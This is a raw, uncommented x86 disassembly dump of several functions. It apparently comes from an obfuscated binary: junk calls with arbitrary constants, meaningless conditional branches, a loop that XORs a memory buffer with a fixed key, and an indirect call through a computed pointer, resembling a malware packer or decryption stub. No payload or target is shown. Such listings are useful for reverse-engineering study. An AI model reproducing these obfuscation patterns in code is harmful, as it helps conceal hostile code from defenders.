  407732:	call   0x408c13
  407737:	add    esp,0x8
  40773a:	push   esi
  40773b:	call   0x408c13
  407740:	push   edi
  407741:	mov    ecx,eax
  407743:	push   0x77a45e00
  407748:	call   0x408aa5
  40774d:	add    esp,0x4
  407750:	push   0xd58fdb00
  407755:	push   0xffffffeb
  407757:	push   0x53753700
  40775c:	call   0x40807c
  407761:	add    esp,0xc
  407764:	push   0xff5bb600
  407769:	push   0xffffffca
  40776b:	push   0xa71e6f00
  407770:	push   0xffffffff
  407772:	push   0x32
  407774:	call   0x408e8e
  407779:	add    esp,0x14
  40777c:	mov    eax,DWORD PTR [ebp+0x10]
  40777f:	mov    edi,0xad
  407784:	add    edi,edi
  407786:	xor    esi,esi
  407788:	mov    DWORD PTR [ebp-0x14],edi
  40778b:	cmp    eax,DWORD PTR [ebp-0x28]
  40778e:	je     0x4077a6
  407790:	mov    esi,DWORD PTR [ebp-0x14]
  407793:	mov    ebx,0x71014a0
  407798:	xor    DWORD PTR [ebp-0x14],esi
  40779b:	add    ebx,ebx
  40779d:	or     DWORD PTR [ebp-0x14],eax
  4077a0:	or     DWORD PTR [ebp-0x14],edi
  4077a3:	sub    DWORD PTR [ebp-0x14],ebx
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	mov    DWORD PTR [ebp-0x14],edx
  4077ac:	cmp    DWORD PTR [ebp+0xc],eax
  4077af:	je     0x407849
  4077b5:	test   esi,0x23
  4077bb:	je     0x4077c0
  4077bd:	sub    DWORD PTR [ebp-0x14],eax
  4077c0:	dec    DWORD PTR [ebp+0xc]
  4077c3:	add    ebx,edx
  4077c5:	mov    edi,DWORD PTR [ebp-0x14]
  4077c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4077cb:	or     ecx,eax
  4077cd:	add    DWORD PTR [ebp-0x14],ecx
  4077d0:	cmp    edi,0xd3c2
  4077d6:	jne    0x4077e3
  4077d8:	cmp    ebx,0xffffff90
  4077db:	jne    0x4077e3
  4077dd:	xor    DWORD PTR [ebp-0x14],edi
  4077e0:	add    DWORD PTR [ebp-0x14],ebx
  4077e3:	add    DWORD PTR [edx],eax
  4077e5:	mov    edi,DWORD PTR [ebp-0x14]
  4077e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4077eb:	cmp    ecx,DWORD PTR [ebp-0x2c]
  4077ee:	jne    0x407820
  4077f0:	sub    DWORD PTR [ebp-0x14],ecx
  4077f3:	sub    edi,ebx
  4077f5:	test   edi,0xfd
  4077fb:	jne    0x407820
  4077fd:	add    edi,eax
  4077ff:	mov    ecx,0x82
  407804:	sub    DWORD PTR [ebp-0x14],ebx
  407807:	test   edi,0x4d
  40780d:	je     0x407820
  40780f:	cmp    edi,0x77
  407812:	jne    0x407820
  407814:	and    ecx,edx
  407816:	add    edi,edx
  407818:	sub    DWORD PTR [ebp-0x14],edi
  40781b:	add    ecx,edi
  40781d:	add    DWORD PTR [ebp-0x14],ecx
  407820:	xor    DWORD PTR [edx],0xd42c4be6
  407826:	add    DWORD PTR [ebp-0x14],ecx
  407829:	add    edx,0x4
  40782c:	add    ecx,edi
  40782e:	mov    edi,DWORD PTR [ebp-0x14]
  407831:	add    DWORD PTR [ebp-0x14],edx
  407834:	sub    DWORD PTR [ebp-0x14],edi
  407837:	add    DWORD PTR [ebp-0x14],eax
  40783a:	and    ecx,ebx
  40783c:	cmp    ecx,DWORD PTR [ebp-0x20]
  40783f:	je     0x407844
  407841:	add    DWORD PTR [ebp-0x14],ecx
  407844:	jmp    0x4077a9
  407849:	cmp    edx,0x41
  40784c:	jne    0x40785b
  40784e:	push   0x578a0200
  407853:	call   0x40807c
  407858:	add    esp,0x4
  40785b:	push   0x61
  40785d:	call   0x408c13
  407862:	add    esp,0x4
  407865:	sub    DWORD PTR [ebp-0x14],eax
  407868:	xor    ecx,ecx
  40786a:	push   0xffffffda
  40786c:	push   0x67
  40786e:	call   0x40807c
  407873:	add    esp,0x8
  407876:	push   0x95b0c900
  40787b:	push   0xffffffa9
  40787d:	call   0x40807c
  407882:	add    esp,0x8
  407885:	pop    edi
  407886:	cmp    edi,0x5210
  40788c:	jne    0x40789b
  40788e:	push   0x97604000
  407893:	call   0x408c13
  407898:	add    esp,0x4
  40789b:	push   0x2b420000
  4078a0:	push   0x3f234000
  4078a5:	push   0xffffffd1
  4078a7:	call   0x408da2
  4078ac:	add    esp,0xc
  4078af:	pop    esi
  4078b0:	push   0xffffffbf
  4078b2:	push   0x8fe33b00
  4078b7:	call   0x408e8e
  4078bc:	add    esp,0x8
  4078bf:	pop    ebx
  4078c0:	and    eax,esi
  4078c2:	xor    edx,edx
  4078c4:	sub    DWORD PTR [ebp-0x14],ebx
  4078c7:	push   0x6d
  4078c9:	call   0x408aa5
  4078ce:	add    esp,0x4
  4078d1:	leave  
  4078d2:	ret    0xc
  4078d5:	int3   
  4078d6:	int3   
  4078d7:	int3   
  4078d8:	int3   
  4078d9:	int3   
  4078da:	push   ebp
  4078db:	mov    ebp,esp
  4078dd:	sub    esp,0x44
  4078e0:	push   0xfc65700
  4078e5:	push   0xdb3ce800
  4078ea:	push   0x73
  4078ec:	push   0xffffff98
  4078ee:	push   0x2b24bd00
  4078f3:	call   0x408817
  4078f8:	add    esp,0x14
  4078fb:	push   ebx
  4078fc:	test   eax,0x29
  407901:	jne    0x40790f
  407903:	push   0x21
  407905:	push   0x5
  407907:	call   0x408589
  40790c:	add    esp,0x8
  40790f:	push   0x95d05600
  407914:	push   0xf58b7300
  407919:	push   0xcf6b0c00
  40791e:	push   0xffffff99
  407920:	push   0x20
  407922:	call   0x408c13
  407927:	add    esp,0x14
  40792a:	push   esi
  40792b:	call   0x408589
  407930:	push   0x2c
  407932:	push   0x57d45e00
  407937:	push   0x4d
  407939:	push   0x5988a00
  40793e:	push   0xffffff84
  407940:	call   0x408aa5
  407945:	add    esp,0x14
  407948:	push   edi
  407949:	push   0x4fe07f00
  40794e:	push   0x16
  407950:	call   0x408aa5
  407955:	add    esp,0x8
  407958:	push   0x3b
  40795a:	call   0x408da2
  40795f:	add    esp,0x4
  407962:	cmp    eax,0xffffffa5
  407965:	je     0x407983
  407967:	mov    edx,eax
  407969:	add    edx,eax
  40796b:	mov    eax,0x1d
  407970:	push   0x77d9a600
  407975:	push   0xffffffab
  407977:	push   0x6c
  407979:	push   0x2a
  40797b:	call   0x408589
  407980:	add    esp,0x10
  407983:	mov    ecx,0x27d7df87
  407988:	xor    esi,esi
  40798a:	mov    DWORD PTR [ebp-0x14],ecx
  40798d:	or     esi,ecx
  40798f:	mov    eax,0x9e
  407994:	sub    DWORD PTR [ebp-0x14],ecx
  407997:	and    eax,ecx
  407999:	sub    DWORD PTR [ebp-0x14],eax
  40799c:	mov    DWORD PTR [ebp-0x14],esi
  40799f:	sub    ecx,0x27d7df47
  4079a5:	add    DWORD PTR [ebp-0x14],esi
  4079a8:	push   ecx
  4079a9:	push   0x5784fe00
  4079ae:	push   0xffffffee
  4079b0:	call   0x408da2
  4079b5:	add    esp,0x8
  4079b8:	mov    esi,0xf462d65
  4079bd:	call   0x408c13
  4079c2:	call   0x408817
  4079c7:	add    esi,0xf0ba029b
  4079cd:	add    DWORD PTR [ebp-0x14],esi
  4079d0:	push   0xdf3c0700
  4079d5:	push   0x3d
  4079d7:	call   0x408c13
  4079dc:	add    esp,0x8
  4079df:	push   esi
  4079e0:	push   0xffffffa1
  4079e2:	push   0xffffffb5
  4079e4:	push   0xc5934200
  4079e9:	push   0x75e8b400
  4079ee:	push   0x6a
  4079f0:	call   0x408817
  4079f5:	add    esp,0x14
  4079f8:	push   0x5f545
  4079fd:	mov    eax,DWORD PTR [ebp-0x14]
  407a00:	xor    ebx,ebx
  407a02:	sub    DWORD PTR [ebp-0x14],eax
  407a05:	push   0x35d4e000
  407a0a:	push   0x8fd54c00
  407a0f:	push   0x6b
  407a11:	call   0x408589
  407a16:	add    esp,0xc
  407a19:	sub    DWORD PTR [ebp-0x14],ebx
  407a1c:	push   0x41
  407a1e:	call   0x408e8e
  407a23:	add    esp,0x4
  407a26:	push   0x0
  407a28:	push   0xa7069900
  407a2d:	push   0x234be600
  407a32:	push   0xf5b07200
  407a37:	call   0x408250
  407a3c:	add    esp,0xc
  407a3f:	mov    edx,0x95c282c0
  407a44:	sub    eax,edx
  407a46:	add    eax,ebx
  407a48:	add    eax,edx
  407a4a:	mov    ebx,DWORD PTR [ebp-0x14]
  407a4d:	add    eax,edx
  407a4f:	add    DWORD PTR [ebp-0x14],ebx
  407a52:	mov    ecx,DWORD PTR [ebp-0x14]
  407a55:	add    eax,eax
  407a57:	cmp    ebx,0x61
  407a5a:	je     0x407a6a
  407a5c:	mov    edi,edx
  407a5e:	mov    ebx,DWORD PTR [ebp-0x14]
  407a61:	sub    ebx,ecx
  407a63:	and    ebx,eax
  407a65:	and    ebx,edi
  407a67:	sub    DWORD PTR [ebp-0x14],ebx
  407a6a:	sub    edx,0x957de138
  407a70:	add    DWORD PTR [ebp-0x14],edi
  407a73:	call   DWORD PTR [edx]
  407a75:	sub    edi,eax
  407a77:	mov    ebx,DWORD PTR [ebp-0x14]
  407a7a:	cmp    ebx,edi
  407a7c:	jne    0x407b05
  407a82:	and    edi,ebx
  407a84:	sub    edi,eax
  407a86:	mov    ecx,DWORD PTR [ebp-0x14]
  407a89:	mov    edx,0x54
  407a8e:	sub    edi,esi
  407a90:	or     DWORD PTR [ebp-0x14],esi
  407a93:	and    edx,ebx
  407a95:	add    edx,esi
  407a97:	cmp    ecx,0x69
  407a9a:	je     0x407b05
  407a9c:	mov    esi,DWORD PTR [ebp-0x14]
  407a9f:	xor    ebx,ebx
  407aa1:	add    DWORD PTR [ebp-0x14],edi
  407aa4:	add    ecx,ebx
  407aa6:	cmp    edx,DWORD PTR [ebp-0x44]
  407aa9:	jne    0x407b05
  407aab:	sub    ecx,eax
  407aad:	cmp    ecx,0x4934
  407ab3:	jne    0x407b05
  407ab5:	add    esi,eax
  407ab7:	mov    edi,ecx
  407ab9:	mov    ecx,0x5c
  407abe:	and    DWORD PTR [ebp-0x14],ecx
  407ac1:	cmp    edi,0x7f
  407ac4:	jne    0x407b05
  407ac6:	cmp    edx,0xfffffff0
  407ac9:	je     0x407b05
  407acb:	mov    ebx,0x9f
  407ad0:	mov    ecx,edx
  407ad2:	cmp    ecx,DWORD PTR [ebp-0x4]
  407ad5:	je     0x407b05
  407ad7:	mov    edx,ebx
  407ad9:	cmp    eax,0x5605
  407ade:	je     0x407b05
  407ae0:	sub    edi,ebx
  407ae2:	xor    ebx,ebx
  407ae4:	sub    esi,ecx
  407ae6:	mov    ecx,DWORD PTR [ebp-0x14]
  407ae9:	or     DWORD PTR [ebp-0x14],edx
  407aec:	cmp    esi,DWORD PTR [ebp-0x3c]
  407aef:	je     0x407b05
  407af1:	mov    edx,DWORD PTR [ebp-0x14]
  407af4:	or     ecx,eax
  407af6:	mov    DWORD PTR [ebp-0x14],ebx
  407af9:	add    DWORD PTR [ebp-0x14],ecx
  407afc:	sub    DWORD PTR [ebp-0x14],edi
  407aff:	add    DWORD PTR [ebp-0x14],esi
  407b02:	sub    DWORD PTR [ebp-0x14],edx
  407b05:	mov    DWORD PTR [ebp-0x2c],eax
  407b08:	push   0x370fac00
  407b0d:	push   0x8f971700
  407b12:	push   0xc7311200
  407b17:	call   0x408817
  407b1c:	add    esp,0xc
  407b1f:	push   0x6358c100
  407b24:	push   0xfbb5600
  407b29:	push   0x1596c800
  407b2e:	push   0xffffff96
  407b30:	call   0x408817
  407b35:	add    esp,0x10
  407b38:	mov    esi,0x55806f5
  407b3d:	push   0x95ddbf00
  407b42:	push   0x77928700
  407b47:	call   0x4086d1
  407b4c:	add    esp,0x8
  407b4f:	push   0x28
  407b51:	push   0x7e
  407b53:	push   0x75
  407b55:	call   0x408aa5
  407b5a:	add    esp,0xc
  407b5d:	add    esi,0xfaec990b
  407b63:	push   0x41
  407b65:	push   0xffffffab
  407b67:	push   0x3b16a000
  407b6c:	push   0xffffffee
  407b6e:	call   0x408250
  407b73:	add    esp,0x10
  407b76:	mov    DWORD PTR [ebp-0x30],esi
  407b79:	push   0x57b09000
  407b7e:	push   0x35b37100
  407b83:	push   0x3f3baf00
  407b88:	push   0x6c
  407b8a:	call   0x4086d1
  407b8f:	add    esp,0x10
  407b92:	call   0x4086d1
  407b97:	mov    edi,DWORD PTR [ebp-0x2c]
  407b9a:	sub    DWORD PTR [ebp-0x14],eax
  407b9d:	cmp    edi,0x7e
  407ba0:	je     0x407be9
  407ba2:	cmp    edi,0xfffffff3
  407ba5:	je     0x407be9
  407ba7:	cmp    edi,esi
  407ba9:	je     0x407be9
  407bab:	and    esi,edi
  407bad:	and    esi,edi
  407baf:	xor    ecx,ecx
  407bb1:	sub    esi,edi
  407bb3:	mov    edx,eax
  407bb5:	test   eax,0x78f1
  407bba:	jne    0x407be9
  407bbc:	sub    DWORD PTR [ebp-0x14],edx
  407bbf:	and    esi,ecx
  407bc1:	add    esi,esi
  407bc3:	mov    ebx,DWORD PTR [ebp-0x14]
  407bc6:	cmp    ebx,0xffffffd4
  407bc9:	je     0x407be9
  407bcb:	mov    ecx,eax
  407bcd:	add    DWORD PTR [ebp-0x14],esi
  407bd0:	sub    ebx,ecx
  407bd2:	cmp    ecx,eax
  407bd4:	je     0x407be9
  407bd6:	mov    esi,0x93e4
  407bdb:	xor    DWORD PTR [ebp-0x14],ebx
  407bde:	xor    ecx,ecx
  407be0:	sub    esi,ecx
  407be2:	sub    esi,edi
  407be4:	and    esi,ecx
  407be6:	or     DWORD PTR [ebp-0x14],esi
  407be9:	mov    edx,DWORD PTR [ebp-0x30]
  407bec:	sub    esi,edi
  407bee:	mov    ebx,DWORD PTR [ebp-0x14]
  407bf1:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf4:	sub    ecx,edx
  407bf6:	add    esi,edi
  407bf8:	add    DWORD PTR [ebp-0x14],ecx
  407bfb:	add    DWORD PTR [ebp-0x14],ebx
  407bfe:	cmp    ebx,ecx
  407c00:	jne    0x407c05
  407c02:	mov    DWORD PTR [ebp-0x28],esi
  407c05:	mov    esi,DWORD PTR [edx]
  407c07:	add    ecx,ebx
  407c09:	add    DWORD PTR [ebp-0x14],ecx
  407c0c:	mov    ecx,DWORD PTR [edx+0x4]
  407c0f:	mov    ebx,esi
  407c11:	mov    edx,DWORD PTR [ebp-0x14]
  407c14:	and    edx,ecx
  407c16:	add    ebx,ecx
  407c18:	test   edx,0x66
  407c1e:	jne    0x407c4e
  407c20:	cmp    edx,ecx
  407c22:	jne    0x407c4e
  407c24:	cmp    ebx,DWORD PTR [ebp-0x44]
  407c27:	jne    0x407c4e
  407c29:	and    edx,ebx
  407c2b:	add    edx,ecx
  407c2d:	test   eax,0x6a
  407c32:	je     0x407c4e
  407c34:	mov    ebx,DWORD PTR [ebp-0x14]
  407c37:	sub    edx,ebx
  407c39:	mov    ebx,0x39
  407c3e:	add    DWORD PTR [ebp-0x14],ebx
  407c41:	cmp    esi,DWORD PTR [ebp-0x4]
  407c44:	je     0x407c4e
  407c46:	xor    ebx,ebx
  407c48:	sub    DWORD PTR [ebp-0x14],edx
  407c4b:	xor    DWORD PTR [ebp-0x14],ebx
  407c4e:	or     esi,esi
  407c50:	je     0x407d3a
  407c56:	sub    edx,ebx
  407c58:	mov    ebx,DWORD PTR [ebp-0x14]
  407c5b:	sub    edx,ebx
  407c5d:	mov    ebx,eax
  407c5f:	test   edx,0xa4
  407c65:	je     0x407c77
  407c67:	sub    DWORD PTR [ebp-0x14],ebx
  407c6a:	add    DWORD PTR [ebp-0x14],edi
  407c6d:	add    edx,ecx
  407c6f:	sub    DWORD PTR [ebp-0x14],edi
  407c72:	and    edx,eax
  407c74:	add    DWORD PTR [ebp-0x14],edx
  407c77:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c79:	cmp    eax,DWORD PTR [ebp-0x38]
  407c7c:	je     0x407cf1
  407c7e:	cmp    esi,eax
  407c80:	jne    0x407cf1
  407c82:	mov    edx,DWORD PTR [ebp-0x14]
  407c85:	cmp    edi,edx
  407c87:	je     0x407cf1
  407c89:	mov    ebx,DWORD PTR [ebp-0x14]
  407c8c:	add    DWORD PTR [ebp-0x14],ecx
  407c8f:	sub    ebx,edx
  407c91:	cmp    ebx,0xa
  407c94:	jne    0x407cf1
  407c96:	cmp    ebx,ecx
  407c98:	je     0x407cf1
  407c9a:	xor    ecx,ecx
  407c9c:	cmp    eax,0xb
  407c9f:	je     0x407cf1
  407ca1:	cmp    ebx,DWORD PTR [ebp-0x4]
  407ca4:	jne    0x407cf1
  407ca6:	mov    edx,0x31
  407cab:	add    ebx,ecx
  407cad:	or     edx,ebx
  407caf:	cmp    esi,0x1e
  407cb2:	jne    0x407cf1
  407cb4:	and    edx,eax
  407cb6:	add    DWORD PTR [ebp-0x14],esi
  407cb9:	cmp    edi,0xda38
  407cbf:	je     0x407cf1
  407cc1:	add    DWORD PTR [ebp-0x14],edi
  407cc4:	cmp    edx,DWORD PTR [ebp-0x18]
  407cc7:	jne    0x407cf1
  407cc9:	add    edx,ecx
  407ccb:	cmp    edx,0xffffff89
  407cce:	je     0x407cf1
  407cd0:	mov    ebx,DWORD PTR [ebp-0x14]
  407cd3:	or     DWORD PTR [ebp-0x14],ebx
  407cd6:	cmp    edx,ebx
  407cd8:	jne    0x407cf1
  407cda:	mov    ecx,0xc
  407cdf:	mov    ebx,0x5e
  407ce4:	sub    edx,ecx
  407ce6:	sub    DWORD PTR [ebp-0x14],ecx
  407ce9:	sub    DWORD PTR [ebp-0x14],edx
  407cec:	add    ebx,esi
  407cee:	sub    DWORD PTR [ebp-0x14],ebx
  407cf1:	add    DWORD PTR [ebp-0x30],0x8
  407cf5:	test   ebx,0xfc63
  407cfb:	je     0x407d35
  407cfd:	and    ecx,edx
  407cff:	cmp    ecx,0x4f
  407d02:	je     0x407d35
  407d04:	cmp    ecx,DWORD PTR [ebp-0x3c]
  407d07:	je     0x407d35
  407d09:	mov    edx,DWORD PTR [ebp-0x14]
  407d0c:	sub    DWORD PTR [ebp-0x14],ecx
  407d0f:	and    edx,ecx
  407d11:	and    edx,edi
  407d13:	sub    edx,ecx
  407d15:	mov    ebx,DWORD PTR [ebp-0x14]
  407d18:	add    DWORD PTR [ebp-0x14],edx
  407d1b:	test   ebx,0x9
  407d21:	je     0x407d35
  407d23:	cmp    ebx,0x2dee
  407d29:	je     0x407d35
  407d2b:	add    ebx,edi
  407d2d:	cmp    ebx,0xffffffc4
  407d30:	jne    0x407d35
  407d32:	sub    DWORD PTR [ebp-0x14],ebx
  407d35:	jmp    0x407b9a
  407d3a:	push   0xffffffbe
  407d3c:	push   0x3c
  407d3e:	push   0xfffffffb
  407d40:	push   0xffffff88
  407d42:	push   0x3
  407d44:	call   0x408da2
  407d49:	add    esp,0x14
  407d4c:	mov    edi,DWORD PTR ds:0x44a3e0
  407d52:	mov    esi,DWORD PTR [ebp-0x14]
  407d55:	push   0x8f167800
  407d5a:	call   0x408da2
  407d5f:	add    esp,0x4
  407d62:	push   0xe59b6300
  407d67:	call   0x408250
  407d6c:	add    esp,0x4
  407d6f:	push   0x3d
  407d71:	push   0x6f322a00
  407d76:	push   0xa35fba00
  407d7b:	push   0xa
  407d7d:	push   0x71
  407d7f:	call   0x4086d1
  407d84:	add    esp,0x14
  407d87:	push   0xfffffff9
  407d89:	call   0x408c13
  407d8e:	add    esp,0x4
  407d91:	call   0x408aa5
  407d96:	push   0xc331e100
  407d9b:	push   0x2f
  407d9d:	push   0x34
  407d9f:	push   0x6e
  407da1:	push   0xcf457e00
  407da6:	call   0x408589
  407dab:	add    esp,0x14
  407dae:	call   0x408589
  407db3:	push   0xffffff80
  407db5:	call   0x408e8e
  407dba:	add    esp,0x4
  407dbd:	push   0x472dd500
  407dc2:	push   0xffffffda
  407dc4:	push   0x23
  407dc6:	call   0x408589
  407dcb:	add    esp,0xc
  407dce:	cmp    esi,DWORD PTR ds:0x44a3e0
  407dd4:	jne    0x407f32
  407dda:	add    edi,eax
  407ddc:	call   0x408250
  407de1:	push   0x36aa700
  407de6:	push   0x53444000
  407deb:	push   0xfb1c8e00
  407df0:	call   0x40807c
  407df5:	add    esp,0xc
  407df8:	sub    esi,eax
  407dfa:	push   0x41
  407dfc:	push   0xfb21b00
  407e01:	push   0x41
  407e03:	push   0x73
  407e05:	call   0x408aa5
  407e0a:	add    esp,0x10
  407e0d:	test   edi,0xc2
  407e13:	jne    0x407f32
  407e19:	push   0x47
  407e1b:	push   0x61
  407e1d:	push   0xcf8af200
  407e22:	push   0x1f
  407e24:	push   0xffffff9f
  407e26:	call   0x408aa5
  407e2b:	add    esp,0x14
  407e2e:	add    DWORD PTR [ebp-0x14],esi
  407e31:	mov    ebx,eax
  407e33:	push   0xffffffe1
  407e35:	push   0x559ce800
  407e3a:	push   0xffffffc5
  407e3c:	call   0x408e8e
  407e41:	add    esp,0xc
  407e44:	sub    ebx,esi
  407e46:	push   0xffffffa2
  407e48:	push   0x24
  407e4a:	push   0xfffffff2
  407e4c:	push   0xfffffffe
  407e4e:	push   0xc5ea4f00
  407e53:	call   0x408589
  407e58:	add    esp,0x14
  407e5b:	cmp    edi,eax
  407e5d:	jne    0x407f32
  407e63:	add    edi,eax
  407e65:	call   0x408c13
  407e6a:	add    DWORD PTR [ebp-0x14],ebx
  407e6d:	mov    ecx,DWORD PTR [ebp-0x14]
  407e70:	push   0xaf32f200
  407e75:	call   0x4086d1
  407e7a:	add    esp,0x4
  407e7d:	cmp    edi,esi
  407e7f:	je     0x407f32
  407e85:	mov    ebx,DWORD PTR [ebp-0x14]
  407e88:	push   0x30
  407e8a:	push   0xffffffae
  407e8c:	push   0xe7170a00
  407e91:	push   0x16
  407e93:	call   0x408250
  407e98:	add    esp,0x10
  407e9b:	push   0xf7979b00
  407ea0:	push   0x336ed300
  407ea5:	push   0x33
  407ea7:	push   0xeb66ab00
  407eac:	push   0x7348e800
  407eb1:	call   0x40807c
  407eb6:	add    esp,0x14
  407eb9:	cmp    ebx,0x0
  407ebc:	je     0x407f32
  407ebe:	push   0xa3410d00
  407ec3:	push   0x1f4b4900
  407ec8:	push   0x57d55500
  407ecd:	push   0xffffffae
  407ecf:	call   0x408e8e
  407ed4:	add    esp,0x10
  407ed7:	mov    edx,DWORD PTR [ebp-0x14]
  407eda:	push   0xfffffffc
  407edc:	call   0x408aa5
  407ee1:	add    esp,0x4
  407ee4:	push   0x4b
  407ee6:	call   0x408c13
  407eeb:	add    esp,0x4
  407eee:	push   0xffffffe7
  407ef0:	push   0xf5f5e100
  407ef5:	push   0x63
  407ef7:	push   0x271bb800
  407efc:	call   0x408250
  407f01:	add    esp,0x10
  407f04:	push   0x74
  407f06:	push   0xffffff9f
  407f08:	push   0x65a9a700
  407f0d:	call   0x408e8e
  407f12:	add    esp,0xc
  407f15:	call   0x408817
  407f1a:	sub    DWORD PTR [ebp-0x14],edi
  407f1d:	mov    eax,DWORD PTR [ebp-0x14]
  407f20:	cmp    eax,DWORD PTR [ebp-0x18]
  407f23:	je     0x407f32
  407f25:	sub    DWORD PTR [ebp-0x14],ebx
  407f28:	xor    esi,esi
  407f2a:	call   0x408da2
  407f2f:	mov    DWORD PTR [ebp-0x24],esi
  407f32:	call   0x408c13
  407f37:	mov    eax,DWORD PTR [ebp-0x2c]
  407f3a:	sub    esi,eax
  407f3c:	sub    esi,ebx
  407f3e:	mov    edi,DWORD PTR [ebp-0x14]
  407f41:	cmp    eax,DWORD PTR ds:0x44a3e0
  407f47:	je     0x407fcd
  407f4d:	add    esi,edi
  407f4f:	mov    ebx,0x1b
  407f54:	mov    edx,DWORD PTR [ebp-0x14]
  407f57:	add    edx,edi
  407f59:	add    edx,edi
  407f5b:	cmp    esi,DWORD PTR [ebp-0x34]
  407f5e:	je     0x407fcd
  407f60:	sub    DWORD PTR [ebp-0x14],ebx
  407f63:	add    DWORD PTR [ebp-0x14],esi
  407f66:	mov    esi,DWORD PTR [ebp-0x14]
  407f69:	mov    ebx,DWORD PTR [ebp-0x14]
  407f6c:	mov    DWORD PTR [ebp-0x14],esi
  407f6f:	cmp    edx,0x35
  407f72:	je     0x407fcd
  407f74:	and    DWORD PTR [ebp-0x14],edx
  407f77:	mov    edi,0xbb
  407f7c:	mov    esi,DWORD PTR [ebp-0x14]
  407f7f:	sub    esi,edi
  407f81:	sub    DWORD PTR [ebp-0x14],esi
  407f84:	add    DWORD PTR [ebp-0x14],edx
  407f87:	cmp    ebx,0xc3b6
  407f8d:	jne    0x407fcd
  407f8f:	mov    edx,DWORD PTR ds:0x44a3e0
  407f95:	mov    ecx,DWORD PTR [ebp-0x14]
  407f98:	add    DWORD PTR [ebp-0x14],ebx
  407f9b:	add    edx,edi
  407f9d:	add    DWORD PTR [ebp-0x14],edx
  407fa0:	test   esi,0x26a
  407fa6:	jne    0x407fcd
  407fa8:	add    ecx,edi
  407faa:	cmp    ecx,DWORD PTR ds:0x44a3e0
  407fb0:	jne    0x407fcd
  407fb2:	mov    edx,DWORD PTR [ebp-0x14]
  407fb5:	cmp    ecx,0x31
  407fb8:	je     0x407fcd
  407fba:	mov    edi,ecx
  407fbc:	mov    esi,0x97
  407fc1:	add    DWORD PTR [ebp-0x14],edx
  407fc4:	mov    DWORD PTR [ebp-0x14],eax
  407fc7:	mov    DWORD PTR [ebp-0x14],esi
  407fca:	sub    DWORD PTR [ebp-0x14],edi
  407fcd:	mov    ecx,DWORD PTR ds:0x44a3e0
  407fd3:	sub    ecx,eax
  407fd5:	mov    edx,DWORD PTR [ebp-0x14]
  407fd8:	add    ecx,ebx
  407fda:	cmp    ecx,0x1d
  407fdd:	je     0x408032
  407fdf:	sub    ecx,edi
  407fe1:	cmp    edx,DWORD PTR ds:0x44a3e0
  407fe7:	jne    0x408032
  407fe9:	xor    ebx,ebx
  407feb:	mov    edi,0x43410296
  407ff0:	add    edx,esi
  407ff2:	add    DWORD PTR [ebp-0x14],edx
  407ff5:	mov    DWORD PTR [ebp-0x10],ecx
  407ff8:	and    edi,edx
  407ffa:	sub    ebx,ecx
  407ffc:	test   ebx,0xcd
  408002:	jne    0x408032
  408004:	cmp    edi,ebx
  408006:	je     0x408032
  408008:	sub    DWORD PTR [ebp-0x10],ebx
  40800b:	mov    esi,DWORD PTR [ebp-0x10]
  40800e:	xor    ebx,ebx
  408010:	cmp    esi,0x6c
  408013:	jne    0x40801a
  408015:	sub    esi,edi
  408017:	mov    DWORD PTR [ebp-0x10],esi
  40801a:	cmp    eax,edx
  40801c:	je     0x408032
  40801e:	mov    esi,DWORD PTR [ebp-0x14]
  408021:	mov    DWORD PTR [ebp-0x14],esi
  408024:	mov    esi,0x83594693
  408029:	or     DWORD PTR [ebp-0x10],edi
  40802c:	add    DWORD PTR [ebp-0x10],ebx
  40802f:	xor    DWORD PTR [ebp-0x10],esi
  408032:	pop    edi
  408033:	add    esi,esi
  408035:	sub    DWORD PTR [ebp-0x14],edi
  408038:	and    DWORD PTR [ebp-0x14],eax
  40803b:	add    esi,esi
  40803d:	xor    ecx,ecx
  40803f:	sub    ecx,eax
  408041:	sub    DWORD PTR [ebp-0x14],edx
  408044:	mov    edx,DWORD PTR [ebp-0x14]
  408047:	or     DWORD PTR [ebp-0x14],edx
  40804a:	cmp    ecx,edi
  40804c:	je     0x408067
  40804e:	mov    edx,DWORD PTR [ebp-0x14]
  408051:	mov    ebx,0xc8
  408056:	sub    DWORD PTR [ebp-0x14],edx
  408059:	add    ecx,esi
  40805b:	add    ecx,edi
  40805d:	sub    ebx,esi
  40805f:	sub    DWORD PTR [ebp-0x14],ecx
  408062:	sub    ebx,ecx
  408064:	and    DWORD PTR [ebp-0x14],ebx
  408067:	pop    esi
  408068:	add    DWORD PTR [ebp-0x14],ebx
  40806b:	pop    ebx
  40806c:	sub    ecx,eax
  40806e:	add    ecx,ecx
  408070:	sub    ecx,esi
  408072:	add    DWORD PTR [ebp-0x14],ecx
  408075:	leave  
  408076:	ret    
  408077:	int3   
  408078:	int3   
  408079:	int3   
  40807a:	int3   
  40807b:	int3   
  40807c:	push   ebp
  40807d:	mov    ebp,esp
  40807f:	sub    esp,0x38
  408082:	mov    ecx,0x91
  408087:	xor    eax,eax
  408089:	sub    eax,ecx
  40808b:	push   0x35
  40808d:	call   0x408aa5
  408092:	add    esp,0x4
  408095:	push   ebx
  408096:	mov    DWORD PTR [ebp-0x1c],eax
  408099:	push   0x2d
  40809b:	push   0xe581da00
  4080a0:	push   0xffffff87
  4080a2:	push   0x7e
  4080a4:	call   0x4086d1
  4080a9:	add    esp,0x10
  4080ac:	push   esi
  4080ad:	push   0xffffffa6
  4080af:	push   0x4e
  4080b1:	call   0x408da2
  4080b6:	add    esp,0x8
  4080b9:	push   0x4f999200
  4080be:	push   0x43
  4080c0:	push   0x2
  4080c2:	push   0xffffffa4
  4080c4:	call   0x408589
  4080c9:	add    esp,0x10
  4080cc:	push   edi
  4080cd:	test   eax,0x15c74013
  4080d2:	jne    0x40815a
  4080d8:	xor    edi,edi
  4080da:	xor    ebx,ebx
  4080dc:	push   0xf915a00
  4080e1:	push   0xcb5a9100
  4080e6:	call   0x408aa5
  4080eb:	add    esp,0x8
  4080ee:	push   0x57863e00
  4080f3:	push   0x20
  4080f5:	push   0x1755bc00
  4080fa:	push   0xff1c8200
  4080ff:	push   0xff66300
  408104:	call   0x408da2
  408109:	add    esp,0x14
  40810c:	push   0xb5f58900
  408111:	push   0x1a
  408113:	push   0x47304500
  408118:	call   0x408817
  40811d:	add    esp,0xc
  408120:	call   0x408da2
  408125:	push   0xffffffd8
  408127:	push   0x79
  408129:	push   0x74
  40812b:	push   0xffffff84
  40812d:	call   0x4086d1
